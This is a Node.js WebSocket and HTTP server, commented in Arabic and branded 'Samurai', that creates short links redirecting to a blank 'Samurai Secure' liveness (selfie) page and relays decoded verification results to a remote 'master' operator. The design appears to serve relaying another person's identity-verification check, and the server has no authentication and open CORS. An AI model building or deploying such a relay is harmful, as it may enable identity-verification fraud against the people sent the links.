const WebSocket = require('ws');
const http = require('http');
const crypto = require('crypto'); // 🔥 مكتبة التشفير لضمان عدم تطابق الروابط نهائياً

const PORT = process.env.PORT || 8080;

// تخزين الاتصالات والروابط في الذاكرة العشوائية (RAM) لسرعة خيالية
const masters = {}; 
const sessionsDB = {}; 

const server = http.createServer((req, res) => {
    // إعدادات CORS للسماح بالاتصال من أي مصدر
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    // ==========================================
    // 1. نظام الروابط القصيرة (توليد معزول 100%)
    // ==========================================
    if (req.method === 'POST' && req.url === '/shorten') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                if (data.session) {
                    let shortId;
                    // 🔥 حلقة تأمين: توليد كود مشفر، والتأكد 100% أنه غير موجود مسبقاً لمنع الاختلاط
                    do {
                        shortId = crypto.randomBytes(3).toString('hex'); // يولد كود من 6 أحرف
                    } while (sessionsDB[shortId]); 

                    sessionsDB[shortId] = data.session;
                    
                    const host = req.headers['x-forwarded-host'] || req.headers.host;
                    const protocol = req.headers['x-forwarded-proto'] || 'https';
                    const shortUrl = `${protocol}://${host}/s/${shortId}`;
                    
                    console.log(`🔗 [LINK CREATED] ID: ${shortId} | Total Active: ${Object.keys(sessionsDB).length}`);
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ shortUrl: shortUrl }));
                } else {
                    res.writeHead(400); res.end(JSON.stringify({ error: "Missing session data" }));
                }
            } catch (e) {
                res.writeHead(400); res.end();
            }
        });
        return;
    }

    // ==========================================
    // 2. استرجاع الجلسة والتوجيه
    // ==========================================
    if (req.method === 'POST' && req.url === '/resolve') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const longSession = sessionsDB[data.short_id]; 
                
                if (longSession) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ session: longSession }));
                } else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: "Not found" }));
                }
            } catch (e) { res.writeHead(400); res.end(); }
        });
        return;
    }

    if (req.method === 'GET' && req.url.startsWith('/s/')) {
        const shortId = req.url.split('/')[2]; 
        const longSession = sessionsDB[shortId]; 
        
        if (longSession) {
            res.writeHead(302, { 'Location': `/liveness?session=${encodeURIComponent(longSession)}` });
            res.end();
        } else {
            res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end('<h2 style="text-align:center; color:red; font-family:sans-serif; margin-top:50px;">الرابط غير صالح أو انتهت صلاحيته</h2>');
        }
        return;
    }

    // ==========================================
    // 3. مراقبة السيلفي (استقبال غير محدود لدعم إعادة المحاولة)
    // ==========================================
    if (req.method === 'GET' && req.url.startsWith('/liveness')) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        // تم إضافة خلفية سوداء هنا لتتناسب مع التصميم
        res.end('<html><head><title>Samurai Secure</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body id="samurai-canvas" style="background:#050507;"></body></html>');
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const targetSession = data.session_id; 

                // بحث دقيق عن الماستر المرتبط بهذه الجلسة فقط (الآن يدعم رسائل متعددة للريتراي)
                if (targetSession && masters[targetSession]) {
                    const masterWs = masters[targetSession];
                    
                    if (masterWs.readyState === WebSocket.OPEN) {
                        let messageToMaster = null;

                        if (data.type) {
                            messageToMaster = { type: data.type, reason: data.reason || null };
                        } else if (data.payload) {
                            const decoded = Buffer.from(data.payload, 'base64').toString();
                            messageToMaster = { type: 'UUID_RECEIVED', uuid: JSON.parse(decoded).result };
                        }

                        if (messageToMaster) {
                            masterWs.send(JSON.stringify(messageToMaster));
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: true }));
                            return;
                        }
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: "Master offline" }));

            } catch (e) { res.writeHead(400); res.end(); }
        });
        return;
    }

    res.writeHead(200); res.end('Samurai Core Server Online 🥷');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    let mySessionId = null; // 🔒 هذه المساحة معزولة تماماً لكل ماستر يتصل

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                mySessionId = data.session_id;
                masters[mySessionId] = ws; // ربط السوكيت بالجلسة بدقة متناهية
                console.log(`👨‍💻 [MASTER CONNECTED] Active Masters: ${Object.keys(masters).length}`);
            }
        } catch(e) {}
    });

    ws.on('close', () => {
        if (mySessionId && masters[mySessionId]) {
            delete masters[mySessionId]; // تنظيف الذاكرة فوراً لتخفيف الضغط
            console.log(`🔌 [MASTER DISCONNECTED] Active Masters: ${Object.keys(masters).length}`);
            
            // 🛑 [تم حذف كود إزالة الرابط من الذاكرة (sessionsDB) من هنا] 🛑
            // السبب: لكي نسمح لك بعمل Refresh لصفحتك كـ ماستر بدون أن ينكسر الرابط عند العميل.
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SAMURAI CORE RUNNING ON PORT ${PORT}`);
});
